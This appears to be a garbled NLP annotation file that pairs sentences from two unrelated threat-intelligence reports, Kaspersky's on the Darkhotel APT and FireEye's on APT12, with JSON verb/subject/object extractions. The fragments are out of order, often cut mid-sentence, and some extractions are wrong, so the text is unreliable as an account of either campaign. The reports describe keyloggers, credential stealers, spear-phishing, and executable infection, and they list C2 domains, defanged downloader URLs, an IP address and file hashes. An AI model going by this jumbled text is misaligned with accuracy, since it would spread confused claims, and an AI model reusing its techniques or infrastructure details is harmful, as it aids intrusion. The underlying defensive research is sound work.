\uc77c\ubc18 means \u201cGeneral\u201d in Korean\n</list>\nIt probably was developed as a part of a mid-to-late 2009 project:\ne:\\project\\2009\\x\\total_source\\32bit\\ndiskpro\\src\\ioman.c\n</section>\n\n<section>\n<heading>Keylogger Code</heading>\nThis driver package is built to resemble a legitimate low-level Microsoft system\ndevice": [{"is built": {"A": "is built", "O": ["to resemble a legitimate low-level Microsoft system device", "This driver package"]}}, {"is dropped": {"A": "is dropped", "O": ["This keylogger", "by code running within svchost.exe on WinXP SP3"]}}], " The attackers maintain\na\u00a0web interface to vet these new victim systems": [{"maintain": {"A": "maintain", "S": "The attackers", "O": ["to vet these new victim systems", "a\u00a0web interface"]}}], " It drops the igfxext.exe \u201cselective infector\u201d component to disk and\nruns it": [{"drops": {"A": "drops", "S": "It", "O": ["the igfxext.exe \u201cselective infector\u201d component", "to disk"]}, "runs": {"A": "runs", "S": "It", "O": ["it"]}}], "\nThe attackers were also very careful to immediately delete all traces of their\ntools as soon as an attack was carried out successfully": [{"delete": {"A": "delete", "S": "The attackers", "O": ["all traces of their tools", "as soon as an attack was carried out successfully"]}}], "\n</section>\n\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                       \n<header>7</header>\n\n<section>\n<heading>Indiscriminate Spread</heading>\nAn example of the Darkhotel APT\u2019s indiscriminate malware spreading is dem-\nonstrated by the way it seeds Japanese p2p sharing sites, where the malware\nis delivered as a part of a large (approximately 900mb) rar archive": [{"seeds": {"A": "seeds", "S": "it", "O": ["Japanese p2p sharing sites"]}}, {"is delivered": {"A": "is delivered", "O": ["as a part of a large (approximately 900mb) rar archive", "the malware"]}}], " Related\nDarkhotel command and control server domains include:\n<list>\n microblo5.mooo.com\n microyours.ignorelist.com\n micronames.jumpingcrab.com\n microchisk.mooo.com\n microalba.serveftp.com\n</list>\n</section>\n\n<section>\n<heading>Darkhotel Spear-phishing Campaigns</heading>\nDarkhotel campaigns involving typical spear-phished Tapaoux implants publicly\nappeared in bits and pieces several times over the past five years": [{"include": {"A": "include", "S": "Related Darkhotel command and control server domains"}}, {"involving": {"A": "involving", "S": "Darkhotel campaigns", "O": ["typical spear-phished Tapaoux implants"]}}], " In\nthe past few years, they deployed 0-day spear-phishing attacks targeting Adobe\nproducts and Microsoft Internet Explorer, including cve\u00ad2010\u00ad0188": [{"deployed": {"A": "deployed", "S": "they", "O": ["0-day spear-phishing attacks"]}}, {"targeting": {"A": "targeting", "S": "0-day spear-phishing attacks", "O": ["Adobe products and Microsoft Internet Explorer, including cve\u00ad2010\u00ad0188"]}}], "\n                               sha1/RSA (2048bits)\n</table>\n</section>\n\n<footer>\nTLP: Green\t                    For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                   \n<header>13</header>\n\n<section>\n<heading>Enhanced Keyloggers and Development</heading>\nOne of the most interesting components that we discovered as a part of this cam-\npaign was the use of a digitally\u00adsigned advanced keylogger": [{"was": {"A": "was", "S": "One of the most interesting components that we discovered as a part of this cam- paign", "O": ["the use of a digitally\u00adsigned advanced keylogger"]}}], " It is slightly surprising that no rootkit functionality\nhides this service:\n\n<figure></figure>\n\n\nWhen loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and\nretrieves keystroke data directly from port 0x60, the motherboard keyboard con-\ntroller itself": [{"retrieves": {"A": "retrieves", "S": "the NDISKPRO.SYS driver", "O": ["keystroke data", "directly from port 0x60, the motherboard keyboard con- troller itself"]}, "hooks": {"A": "hooks", "S": "the NDISKPRO.SYS driver", "O": ["both INT 0x01 and INT 0xff"]}}], " In a recent case, word docs embed-\nded with 0-day flash swf files either dropped these backdoors or downloaded and\nexecuted backdoors from remote web servers": [{"executed": {"A": "executed", "S": "word docs"}, "dropped": {"A": "dropped", "S": "word docs", "O": ["these backdoors"]}, "downloaded": {"A": "downloaded", "S": "word docs", "O": ["from remote web servers"]}}, {"embed- ded": {"A": "embed- ded", "O": ["word docs", "with 0-day flash swf files"]}}], "\n<list>\n\u201ctorrent\\[hgd\u8d44\u6e90\u7ec4][\u6f2b\u753b]comic1\u26067\u6f2b\u753b\u5408\u96c6\u2462+\u2463+\u2464+\u7279\u5178[5.08g][\u7ec5\u58eb\n\u5411][\u603b\u7b2c\u56db\u5341\u4e09\u5f39]\uff08\u4e03\u5915\u8282\u5feb\u4e50\uff01\uff09\\\u6c49\u5316\\(comic1\u26067) [\u8389\u96f6 (\u5c0f\u9e7f\u308a\u306a, \u53e4\n\u4ee3\u5175\u5668)] \u51cc \u00adshinogi\u00ad(\u95ea\u4e71\u30ab\u30b0\u30e9) [\u4e2d\u6587] \u201c\nand\n\u201c\u52d5\u6f2b\\[hgd\u8d44\u6e90\u7ec4][\u6f2b\u753b]comic1\u26067\u6f2b\u753b\u5408\u96c6\u2462+\u2463+\u2464+\u7279\u5178[5.08g][\u7ec5\u58eb\u5411][\n\u603b\u7b2c\u56db\u5341\u4e09\u5f39]\uff08\u4e03\u5915\u8282\u5feb\u4e50\uff01\uff09\\\u6c49\u5316\u201d)\n</list>\nThe associated Darkhotel backdoor was hosted on bittorrent, emule, etc, under\na variety of comic names": [{"was hosted": {"A": "was hosted", "O": ["The associated Darkhotel backdoor", "on bittorrent, emule, etc,", "under a variety of comic names"]}}], "\n<list>\n\u2022\t small downloader\n\u2022\t information stealer\n\u2022\t Trojan\n\u2022\t dropper and self\u00adinjector\n\u2022\t selective infector\n</list>\nThe most interesting behaviors of these components include\n<list>\n\u2022\t highly unusual conditional 180 day command and control communications\n   delay\n\u2022\t self\u00adkill routines when the system default codepage is set to Korean\n\u2022\t enhanced Microsoft IntelliForm authentication theft handling\n\u2022\t infostealer module Internet Explorer, Firefox, and Chrome support\n\u2022\t campaign or stage ID maintenance\n\u2022\t virtual machine execution sensitivity\n\u2022\t selective viral infection routines to focus the spread of malware within organi-\n   zations\n\u2022\t signed malcode (previously noted)\n</list>\n</section>\n\n<section>\n<heading>Small Downloader</heading>\nThis module is quite small (27Kb) and comes as a part of WinRar SFX file that drops\nand starts the module from %APPDATA%\\Microsoft\\Crypto\\DES64v7\\msieckc.exe": [{"starts": {"A": "starts", "S": "WinRar SFX file", "O": ["from %APPDATA%\\Microsoft\\Crypto\\DES64v7\\msieckc.exe"]}, "drops": {"A": "drops", "S": "WinRar SFX file"}}], " The main purpose of the module is to collect various secrets stored on a lo-\ncal system and upload them to Darkhotel command and control servers:\n<list>\n\u2022\t   Cached passwords from Internet Explorer 6/7/8/9 (Windows Protected Storage)\n\u2022\t   Mozilla Firefox stored secrets (<12.0)\n\u2022\t   Chrome stored secrets\n\u2022\t   Gmail Notifier credentials\n\u2022\t   Intelliform\u00adhandled data and credentials:\n     \u25e6\u25e6 Twitter\n     \u25e6\u25e6 Facebook\n     \u25e6\u25e6 Yandex\n     \u25e6\u25e6 Qip\n     \u25e6\u25e6 Nifty\n     \u25e6\u25e6 Mail.ru\n     \u25e6\u25e6 126.com email\n     \u25e6\u25e6 Zapak\n     \u25e6\u25e6 Lavabit (encrypted email service now shut down)\n     \u25e6\u25e6 Bigstring\n     \u25e6\u25e6 Gmx\n     \u25e6\u25e6 Sohu\n     \u25e6\u25e6 Zoho\n     \u25e6\u25e6 Sina\n     \u25e6\u25e6 Care2\n     \u25e6\u25e6 Mail.com\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                  \n<header>17</header>\n\n\n   \u25e6\u25e6 Fastmail\n   \u25e6\u25e6 Inbox\n   \u25e6\u25e6 Gawab (middle\u00adeastern email service)\n   \u25e6\u25e6 163.com\n   \u25e6\u25e6 Lycos\n   \u25e6\u25e6 Lycos mail\n   \u25e6\u25e6 Aol login\n   \u25e6\u25e6 Yahoo! logins\n   \u25e6\u25e6 Yahoo! Japan logins\n   \u25e6\u25e6 Microsoft Live logins\n   \u25e6\u25e6 Google login credentials\n</list>\nThis module is designed to terminate itself on Windows with the system de-\nfault codepage set to Korean": [{"terminate": {"A": "terminate", "S": "This module", "O": ["itself", "on Windows with the system de- fault codepage set to Korean"]}}, {"collect": {"A": "collect", "S": "the module", "O": ["various secrets stored on a lo- cal system"]}, "upload": {"A": "upload", "S": "the module", "O": ["them", "to Darkhotel command and control servers"]}}], " It mim-\nics a GUI desktop application but it does not create any visible windows or dialogs\nto interact with local users": [{"mim- ics": {"A": "mim- ics", "S": "It", "O": ["a GUI desktop application"]}}], "\nWhen a user downloads the torrent and decrypts the zip files, the trojan surrepti-\ntiously is installed and run on the victim system": [{"is installed and run": {"A": "is installed and run", "O": ["the trojan", "on the victim system"]}}], " The attackers successfully de-\nleted traces of their work from earlier attacks in another hotel, but their offensive\ntechniques were the same": [{"de- leted": {"A": "de- leted", "S": "The attackers", "O": ["from earlier attacks in another hotel", "traces of their work"]}}], " This spear-phishing activity continues into\n2014": [{"continues": {"A": "continues", "S": "This spear-phishing activity", "O": ["into 2014"]}}], " But the\nattackers also maintain truly precise targeting information over the victim\u2019s visit,\nmuch like they would know a victim\u2019s email address and content interests in a\nspearphishing attack": [{"maintain": {"A": "maintain", "S": "the attackers", "O": ["over the victim\u2019s visit", "truly precise targeting information"]}}], "\n</section>\n\n\n<footer>\nTLP: Green\t                  For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>24</header>\n\n<section>\n<heading>C2 Communications and Structure</heading>\nTypical main page:\n\n<figure></figure>\n\n\nFor begatrendstone.com, we have the following directory structure:\n<list>\n/bin\n   \u00adread_i.php (main C&C script)\n    \u00adlogin.php (unknown, replies \u201cWrong ID()\u201d)\n/bin/error (error logs stored here)\n     \u00adddrlog\n/bin/tmp\n/bin/SElhxxwiN3pxxiAPxxc9\n      -all.gif\n      /i\n      - encrypted stolen victim system content\n      /L\n      /f\nFor auto2116.phpnet.us, we have the following directory structure:\n/patch\n   \u00adchkupdate.php (main command and control script)\n/patch/error\n    \u00adddrlog\n</list>\nThe group encrypts victim data on their servers with single user/passkey combi-\nnations across multiple victims": [{"encrypts": {"A": "encrypts", "S": "The group", "O": ["with single user/passkey combi- nations across multiple victims", "on their servers", "victim data"]}}], "\nCatch.exe, detected as Backdoor.Win32.Agent.dgrn, communicates with the fol-\nlowing Darkhotel command and control servers:\n<list>\nmicrodelta.crabdance.com\nmicroyours.ignorelist.com\nmicronames.jumpingcrab.com\nmicrochisk.mooo.com\nmicroalba.serveftp.com\n</list>\n\n<footer>\nTLP: Green\t                  For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>8</header>\n\n\nOther examples of this Darkhotel backdoor bound within a shared torrent include\nadult content Japanese anime and more": [{"bound": {"A": "bound", "O": ["this Darkhotel backdoor", "within a shared torrent"]}}, {"detected": {"A": "detected", "O": ["Catch.exe", "as Backdoor.Win32.Agent.dgrn"]}}, {"communicates": {"A": "communicates", "S": "Catch.exe", "O": ["with the fol- lowing Darkhotel command and control servers"]}}], " It was built as MFC framework application with a\nlot of extra calls that should have complicated the analysis of the sample": [{"complicated": {"A": "complicated", "S": "a lot of extra calls", "O": ["the analysis of the sample"]}}], " But what looks like the AxDecrypt.exe decryptor is bound to\nboth the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan": [{"is bound": {"A": "is bound", "O": ["to the dropper for the Darkhotel Catch.exe Karba Trojan", "the AxDecrypt.exe decryptor"]}}], " This file is located\nin the same directory as the original dropper, which maintains persistence across\nreboots with a simple addition to the HKCU run key": [{"maintains": {"A": "maintains", "S": "the original dropper", "O": ["persistence", "across reboots", "with a simple addition to the HKCU run key"]}}], " This is becoming more and more common on the APT scene,\nwhere targeted attacks are used to compromise high profile victims and botnet\nstyle operations are used for massive surveillance or performing other tasks such\nas launching DDoS attacks on hostile parties or simply upgrading victims to more\nsophisticated espionage tools": [{"upgrading": {"A": "upgrading", "S": "botnet style operations", "O": ["to more sophisticated espionage tools", "victims"]}, "launching": {"A": "launching", "S": "botnet style operations", "O": ["on hostile parties", "DDoS attacks"]}}, {"are used": {"A": "are used", "O": ["for massive surveillance", "botnet style operations"]}}, {"compromise": {"A": "compromise", "S": "targeted attacks", "O": ["high profile victims"]}}], " As soon as their target\u2019s stay was over and\nthe attack-frame was closed, the attackers deleted their iframe placement and\nbackdoored executables from the hotel network": [{"deleted": {"A": "deleted", "S": "he attackers", "O": ["from the hotel network", "their iframe placement and backdoored executables"]}}], " The Trojan collects data about the system and anti\u00ad\nmalware software installed on it, and uploads that data to Darkhotel command\nand control servers": [{"uploads": {"A": "uploads", "S": "The Trojan", "O": ["that data", "to Darkhotel command and control servers"]}, "collects": {"A": "collects", "S": "The Trojan", "O": ["about anti\u00ad malware software installed on it"]}}], "\n\n<figure></figure>\n</section>\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>22</header>\n\n<section>\n<heading>Sinkhole Data</heading>\nBecause the operators very actively build up new command and control serv-\ners, it is difficult to sinkhole enough domains to get an accurate overall picture\nof victim system location based on this data": [{"build up": {"A": "build up", "S": "the operators", "O": ["new command and control serv- ers"]}}], " The attacks follow the typical spear-phishing process and in the past couple of\nmonths, exploited systems retrieved downloader executables from web servers like\n<list>\nhxxp://office\u00adrevision.com/update/files22/update.exe or hxxp://trade\u00adinf.com/mt/\nduspr.exe\n</list>\nOver the past few years the group has emailed links that redirect targets\u2019 brows-\ners to Internet Explorer 0-day exploits": [{"retrieved": {"A": "retrieved", "S": "exploited systems", "O": ["from web servers", "downloader executables"]}}, {"redirect": {"A": "redirect", "S": "links", "O": ["to Internet Explorer 0-day exploits", "targets\u2019 brows- ers"]}}, {"emailed": {"A": "emailed", "S": "the group", "O": ["links"]}}, {"follow": {"A": "follow", "S": "The attacks", "O": ["the typical spear-phishing process"]}}], " These tools are dropped by hotel installers spoofing legiti-\nmate software installers, bound within torrent bundles, or dropped by exploits or\nhypertext linked from spear-phishing emails": [{"bound": {"A": "bound", "O": ["hotel installers", "within torrent bundles"]}, "dropped": {"A": "dropped", "S": "exploits", "O": ["hotel installers"]}, "hypertext linked": {"A": "hypertext linked", "O": ["hotel installers", "from spear-phishing emails"]}}, {"are dropped": {"A": "are dropped", "S": "hotel installers", "O": ["These tools"]}, "spoofing": {"A": "spoofing", "S": "hotel installers", "O": ["legiti- mate software installers"]}}], "\nThe following list presents a set of characteristics for the crew:\n<list>\n\u2022\t operational competence to compromise, mis-use, and maintain access to\n   global scale, trusted commercial network resources with strategic precision\n   for years\n\u2022\t advanced mathematical and crypto-analytical offensive capabilities, along\n   with no regard for undermining the trust extended to the Certificate Authorities\n   and the PKI\n\u2022\t indiscriminately infect systems with some regional clarity over trusted and\n   untrusted resources to build and operate large botnets\n\u2022\t well-developed low level keyloggers within an effective and consistent toolset\n\u2022\t a focus throughout campaigns on specific victim categories and tagging them\n\u2022\t a larger, dynamic infrastructure built of apache webservers, dynamic dns\n   records, crypto libraries, and php webapps\n\u2022\t regular 0-day access - recent deployment of an embedded Adobe Flash 0-day\n   spear-phishing exploit, and infrequent deployment of other 0-day resources to\n   sustain larger campaigns over several years\n</list>\n<figure></figure>\n</section>\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>4</header>\n\n<section>\n<heading>Introduction</heading>\nWhen unsuspecting guests, including situationally aware corporate executives and\nhigh-tech entrepreneurs, travel to a variety of hotels and connect to the internet,\nthey are infected with a rare APT Trojan posing as any one of several major software\nreleases": [{"posing": {"A": "posing", "S": "a rare APT Trojan", "O": ["as any one of several major software releases"]}}, {"are infected": {"A": "are infected", "O": ["they", "with a rare APT Trojan"]}}], "\nDuring its infection routine, the infector changes the entrypoint of executable\nfiles, creates an .rdat section, and inserts a small loader in the section, then puts\nits main payload in the overlay": [{"changes": {"A": "changes", "S": "the infector", "O": ["the entrypoint of executable files"]}, "puts": {"A": "puts", "S": "the infector", "O": ["its main payload", "in the overlay"]}, "creates": {"A": "creates", "S": "the infector", "O": ["an .rdat section"]}, "inserts": {"A": "inserts", "S": "the infector", "O": ["in the section", "a small loader"]}}], " Digitally signed Darkhotel\nbackdoors were installed alongside the legitimate packages": [{"were installed": {"A": "were installed", "O": ["alongside the legitimate packages", "Digitally signed Darkhotel backdoors"]}}], "\n</section>\n\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>18</header>\n\n<section>\n<heading>Selective Infector</heading>\nThis component is a virus, and is used to selectively infiltrate into other comput-\ners via USB or network shares": [{"infiltrate": {"A": "infiltrate", "S": "This component", "O": ["via USB"]}}], " The archive\nis also spread over bittorrent, as detailed below": [{"is also spread": {"A": "is also spread", "O": ["The archive", "over bittorrent"]}}], " It\u2019s interesting that the Flash objects were\nembedded in Korean documents titled \u201cList of the latest Japanese AV wind and\nhow to use torrents.docx\u201d (loose English translation)": [{"were embedded": {"A": "were embedded", "O": ["in Korean documents titled \u201cList of the latest Japanese AV wind and how to use torrents.docx\u201d (loose English translation)", "the Flash objects"]}}], "\n</section>\n\n<section>\n<heading>Information Stealer</heading>\nThis module is relatively large (455Kb) and comes as a part of a WinRar SFX file\nthat drops and starts the module from %APPDATA%\\Microsoft\\Display\\DmaUp3": [{"drops": {"A": "drops", "S": "a WinRar SFX file"}, "starts": {"A": "starts", "S": "a WinRar SFX file", "O": ["from %APPDATA%\\Microsoft\\Display\\DmaUp3. exe"]}}], "\n\n\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>14</header>\n\n<figure></figure>\n\n\nThis keylogger module encrypts and stores gathered data in a log file, as men-\ntioned previously": [{"stores": {"A": "stores", "S": "This keylogger module", "O": ["in a log file"]}, "encrypts": {"A": "encrypts", "S": "This keylogger module"}}], "\n\n<figure></figure>\n\n\nOf course, these packages were really installers for Darkhotel APT\u2019s backdoors,\nadded to legitimate installers from Adobe and Google": [{"were": {"A": "were", "S": "these packages", "O": ["really installers for Darkhotel APT\u2019s backdoors"]}}], " This data enables the attackers to present the malicious\niframe precisely to that individual target": [{"present": {"A": "present", "S": "the attackers", "O": ["precisely to that individual target", "the malicious iframe"]}}], "\nFirst, the virus retrieves all available disks and starting from disk number 4 (D:\\)\nto disk number 20 (Z:\\), finds executable files and infects them": [{"retrieves": {"A": "retrieves", "S": "the virus", "O": ["all available disks"]}, "finds": {"A": "finds", "S": "the virus", "O": ["executable files"]}, "infects": {"A": "infects", "S": "the virus", "O": ["them"]}}], "\n</section>\n\n<section>\n<heading>Campaign Codes</heading>\nAlmost every backdoor in this set maintains an internal campaign code or id, used\nin initial c2 communications as described above": [{"maintains": {"A": "maintains", "S": "Almost every backdoor in this set", "O": ["an internal campaign code or id, used in initial c2 communications as described above"]}}], " The attackers first and foremost\nlist and sort victim systems according to their latest c2 check\u00adin": [{"list and sort": {"A": "list and sort", "S": "The attackers", "O": ["victim systems", "according to their latest c2 check\u00adin"]}}], " Sometimes the attachment itself includes\nan Adobe 0-day exploit": [{"includes": {"A": "includes", "S": "the attachment itself", "O": ["an Adobe 0-day exploit"]}}], "\nThe crew spear-phished a set of target systems connected to the Internet through\nChinese ISPs, and developed capabilities within the 0-day exploits to handle\nhardened Windows 8.1 systems": [{"spear-phished": {"A": "spear-phished", "S": "The crew", "O": ["a set of target systems connected to the Internet through Chinese ISPs"]}}], "\nThis Darkhotel package was downloaded over 30,000 times in less than\nsix months": [{"was downloaded": {"A": "was downloaded", "O": ["This Darkhotel package", "over 30,000 times", "in less than six months"]}}], " Darkhotel uses this method to\ndistribute their Karba Trojan": [{"uses": {"A": "uses", "S": "Darkhotel", "O": ["this method", "to distribute their Karba Trojan"]}}], " It is bound to a variety of other software packages\nthat vary in name, but the host package is consistently detected as \u201cVirus.Win32": [{"is bound": {"A": "is bound", "O": ["to a variety of other software packages that vary in name", "It"]}}], " These tools pull down the keylog-\nger, steal information from the system, or download other tools": [{"pull down": {"A": "pull down", "S": "These tools", "O": ["the keylog- ger"]}, "steal": {"A": "steal", "S": "These tools", "O": ["information", "from the system"]}, "download": {"A": "download", "S": "These tools", "O": ["other tools"]}}], " It is also capable of removing some older components, the names\nof which are hardcoded in the body of the malware": [{"removing": {"A": "removing", "S": "It", "O": ["some older components"]}}], "\n</section>\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                  \n<header>25</header>\n\n<section>\n<heading>Victim Management</heading>\nNew victim systems appear to be systematically vetted": [{"be systematically vetted": {"A": "be systematically vetted", "O": ["New victim systems"]}}], "\nThe component gathers system information and sends it to the Darkhotel com-\nmand and control servers as detailed in Appendix D": [{"gathers": {"A": "gathers", "S": "The component", "O": ["system information"]}, "sends": {"A": "sends", "S": "The component", "O": ["to the Darkhotel com- mand and control servers", "it"]}}], "\nThis first stage of malware helps the attackers to identify more significant victims,\nleading to the selective download of more advanced stealing tools": [{"identify": {"A": "identify", "S": "the attackers", "O": ["more significant victims"]}}, {"download": {"A": "download", "O": ["more advanced stealing tools"]}}], "\nThe Darkhotel c2 maintain these directory structures to store and serve ddrlog\ncontent:\n<list>\n\u2022\t /bin/error/ddrlog\n\u2022\t /patch/error/ddrlog\n</list>\n\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                     \n<header>23</header>\n\n\nThe following structures appear to be common across servers, but do not pro-\nduce ddrlog and do not maintain an /error/ directory:\n<list>\n\u2022\t /u2/\n\u2022\t /u3/\n\u2022\t /patch2/\n\u2022\t /major/\n\u2022\t inor/\n\u2022\t /asp/\n\u2022\t /update3/\n</list>\nTwo ddrlog files report entries starting January 1, 2009 at 9:16 a.m": [{"maintain": {"A": "maintain", "S": "The Darkhotel c2", "O": ["these directory structures", "to store and serve ddrlog content"]}}], "\nMore advanced tools, like the keylogger decribed above, are later downloaded to\nthe victim system by one of these implants": [{"are later downloaded": {"A": "are later downloaded", "S": "one of these implants", "O": ["More advanced tools, like the keylogger decribed above", "to the victim system"]}}], "\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>16</header>\n\n\nOne of the most interesting functions of this executable is its unusual delay and\npersistence": [{"is": {"A": "is", "S": "One of the most interesting functions of this executable", "O": ["its unusual delay and persistence"]}}], "\n\n<figure></figure>\n\n</section>\n\n<section>\n<heading>Available ddrlog Victim Data</heading>\nMany of these c2s maintain a common directory path that serves a ddrlog": [{"maintain": {"A": "maintain", "S": "Many of these c2s", "O": ["a common directory path that serves a ddrlog"]}}], " The attackers set up the environment and hit their\nindividual targets with precision": [{"hit": {"A": "hit", "S": "The attackers", "O": ["their individual targets", "with precision"]}}], " This component then encrypts and writes the retrieved values\nondisk to a randomly named .tmp, file like ffffz07131101.tmp": [{"writes": {"A": "writes", "S": "This component", "O": ["to a randomly named .tmp, file like ffffz07131101.tmp"]}, "encrypts": {"A": "encrypts", "S": "This component"}}], "\n\n<figure></figure>\n\n\nThe most interesting thing about this delivery method is that the hotels require\nguests to use their last name and room number to login, yet only a few guests\nreceived the Darkhotel package": [{"received": {"A": "received", "S": "only a few guests", "O": ["the Darkhotel package"]}}], "\n\n<figure></figure>\n</section>\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                    \n<header>5</header>\n\n<section>\n<heading>\nAnalysis\nDelivery - Hotels/Business Centers and Indiscriminate Spread\n</heading>\n</section>\n<section>\n<heading>Hotels and Business Centers Spread</heading>\nThe Darkhotel APT\u2019s precise malware spread was observed in several hotels\u2019\nnetworks, where visitors connecting to the hotel\u2019s Wi-Fi were prompted to install\nsoftware updates to popular software packages": [{"were prompted": {"A": "were prompted", "O": ["to install software updates to popular software packages", "visitors connecting to the hotel\u2019s Wi-Fi"]}}], "\nThis module is designed to update malicious components through recurring checks\nat the C&C server": [{"update": {"A": "update", "S": "This module", "O": ["malicious components", "through recurring checks at the C&C server"]}}], " The dropped downloader\n(d8137ded710d83e2339a97ee78494c34) delivered malcode similar to the\n\u201cInformation Stealer\u201d component functionality summarized below, and detailed\nin Appendix D": [{"delivered": {"A": "delivered", "S": "The dropped downloader (d8137ded710d83e2339a97ee78494c34)", "O": ["malcode similar to the \u201cInformation Stealer\u201d component functionality summarized below, and detailed in Appendix D"]}}], " So, if some other critical\nmalicious component was removed during this period, current module backs up\nand restores access to the system within 6 months": [{"backs up and restores": {"A": "backs up and restores", "S": "current module", "O": ["access to the system within 6 months"]}}], "\nAt the hotels, these installs are selectively distributed to targeted individuals": [{"are selectively distributed": {"A": "are selectively distributed", "O": ["these installs", "to targeted individuals"]}}], "\nAs a part of an ongoing investigation, our research led us to embedded iframes\nwithin hotel networks that redirected individuals\u2019 web browsers to phony install-\ners": [{"redirected": {"A": "redirected", "S": "embedded iframes within hotel networks", "O": ["individuals\u2019 web browsers", "to phony install- ers"]}}], " Addition-\nally, seeding p2p networks with widely spread malware and 0-day spear-phishing\nattacks demonstrate that the Darkhotel APT maintains an effective toolset and a\nlong-running operation behind the questionable hospitality it shows its guests": [{"seeding": {"A": "seeding", "O": ["p2p networks", "with widely spread malware and 0-day spear-phishing attacks"]}}], " The code simply\nbrute forces the list of mapped removable drives": [{"brute forces": {"A": "brute forces", "S": "The code", "O": ["the list of mapped removable drives"]}}], "\n</section>\n\n<section>\n<heading>Background</heading>\n\nFrom October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor\nthat communicates via HTTP to a hard-coded command and control (C2) server": [{"communicates": {"A": "communicates", "S": "backdoor", "O": ["to a hard-coded command and control (C2) server", "via HTTP"]}}], " This spear phish contained a malicious Word document that\nexploited CVE-2012-0158": [{"contained": {"A": "contained", "S": "This spear phish", "O": ["a malicious Word document that exploited CVE-2012-0158"]}}], " Both backdoors were dropped from malicious documents built\nutilizing the \u201cTran Duy Linh\u201d exploit kit, which exploited CVE-2012-0158": [{"were dropped": {"A": "were dropped", "O": ["Both backdoors", "from malicious documents built utilizing the \u201cTran Duy Linh\u201d exploit kit"]}}], "\n</section>\n\n<section>\n<heading>THREEBYTE Malware Family</heading>\n\nOn Monday August 25, 2014 we observed a different spear phish email sent from lilywang823@gmail.com\nto a technology company located in Taiwan": [{"sent": {"A": "sent", "S": "a different spear phish email", "O": ["to a technology company located in Taiwan", "from lilywang823@gmail.com"]}}], " FireEye observed APT12 deliver these exploit documents\nvia phishing emails in multiple cases": [{"deliver": {"A": "deliver", "S": "APT12", "O": ["via phishing emails", "these exploit documents"]}}], "\n\nSimilar to the newly discovered HIGHTIDE samples documented above, this malicious document dropped\na backdoor to C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\word.exe": [{"dropped": {"A": "dropped", "S": "this malicious document", "O": ["a backdoor"]}}], "\nWe suspect this change was a direct result of the Arbor blog post in order to decrease detection of\nRIPTIDE by security vendors": [{"decrease": {"A": "decrease", "S": "this change", "O": ["detection"]}}], " This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e\nand dropped a backdoor to C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\word.exe": [{"dropped": {"A": "dropped", "S": "This malicious Word document", "O": ["a backdoor"]}}], "\n\nSimilar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that\ncommunicates with its C2 server": [{"communicates": {"A": "communicates", "S": "an HTTP-based backdoor", "O": ["with its C2 server"]}}], " Attached to this email was another malicious document that was designed to exploit\nCVE-2012-0158": [{"Attached": {"A": "Attached", "O": ["to this email", "another malicious document"]}}], " Based on past APT12 activity, we expect the threat group to continue\nto utilize phishing as a malware delivery method": [{"utilize": {"A": "utilize", "S": "the threat group", "O": ["phishing"]}}], "\n</section>\n\n<section>\n<heading>HIGHTIDE Malware Family</heading>\n\nOn Sunday August 24, 2014 we observed a spear phish email sent to a Taiwanese government ministry": [{"sent": {"A": "sent", "O": ["to a Taiwanese government ministry", "a spear phish email"]}}], "\n\n\n<figure></figure>\n\n<caption>Figure 2: APT12 Spearphishing Email</caption>\n\nThe exploit document dropped the HIGHTIDE backdoor with the following properties:\n<table>\nMD5     6e59861931fa2796ee107dc27bfdd480\nSize    75264 bytes\nComplie 2014-08-23 08:22:49\nTime\nImport ead55ef2b18a80c00786c25211981570\nHash\n</table>\n\f\nThe HIGHTIDE backdoor connected directly to 141.108.2.157": [{"dropped": {"A": "dropped", "S": "The exploit document", "O": ["the HIGHTIDE backdoor"]}}], "\n</list>\n</section>\n\n<section>\n<heading>WATERSPOUT Malware Family</heading>\n\nOn August 25, 2014, we observed another round of spear phishing emails targeting a high-technology\ncompany in Japan": [{"targeting": {"A": "targeting", "S": "spear phishing emails", "O": ["a high-technology company in Japan"]}}], " The RIPTIDE exploit document drops its\nexecutable file into the C:\\Documents and Settings\\{user}\\Application Data\\Location folder while the\nHIGHTIDE exploit document drops its executable file into the C:\\DOCUMENTS and SETTINGS\\\n{user}\\LOCAL SETTINGS\\Temp\\ folder": [{"drops": {"A": "drops", "S": "The RIPTIDE exploit document", "O": ["its executable file"]}}, {"drops": {"A": "drops", "S": "the HIGHTIDE exploit document", "O": ["its executable file"]}}], "\n<figure>\nMD5                              File Name                            Exploit\n73f493f6a2b0da23a79b50765c164e88 \u8b70\u7a0b\u6700\u65b0\u4fee\u6b63\u53ca\u6ce8\u610f\u4e8b\u9805.doc                      CVE-2012-0158\nf6fafb7c30b1114befc93f39d0698560 0824.1.doc                           CVE-2012-0158\neaa6e03d9dae356481215e3a9d2914dc \u7c21\u6613\u540d\u518a0\u5168\u570b\u5404\u8b66\u5bdf\u6a5f\u95dc\u4e3b\u5b98\u81f3\u5206\u5c40 CVE-2012-0158\n                                 